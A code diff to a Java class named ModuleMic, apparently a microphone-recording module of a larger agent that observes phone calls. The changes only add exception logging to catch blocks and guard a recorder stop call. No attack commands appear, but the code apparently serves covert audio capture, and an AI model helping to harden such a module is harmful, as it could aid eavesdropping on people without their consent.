@@ -85,6 +85,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			}
 
 		} catch (final IllegalStateException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
 			}
@@ -92,6 +96,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				Check.log(TAG + " (begin) Error: " + e.toString());//$NON-NLS-1$
 			}
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
 			}
@@ -223,6 +231,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				is.read(ret);
 			}
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
 			}
@@ -251,6 +263,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			stopRecorder();
 			startRecorder();
 		} catch (final IllegalStateException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (restartRecorder) Error: " + e);//$NON-NLS-1$
 			}
@@ -258,6 +274,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				Check.log(e);//$NON-NLS-1$
 			}
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (restartRecorder) Error: " + e);//$NON-NLS-1$
 			}
@@ -311,6 +331,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			sender.setReceiveBufferSize(500000);
 			sender.setSendBufferSize(500000);
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (createSockets) Error: " + e);//$NON-NLS-1$
 			}
@@ -325,6 +349,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			receiver.close();
 			lss.close();
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
 			}
@@ -349,8 +377,14 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 		recorder.setOnErrorListener(null);
 		recorder.setOnInfoListener(null);
-
-		recorder.stop();
+	
+		try{
+			recorder.stop();
+		}catch(Exception ex){
+			if (Cfg.DEBUG) {
+				Check.log(ex);
+			}
+		}
 		recorder.reset(); // You can reuse the object by going back to
 							// setAudioSource() step
 		// recorder.release(); // Now the object cannot be reused
@@ -417,10 +451,18 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			try {
 				startRecorder();
 			} catch (final IllegalStateException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
 				}
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
 				}
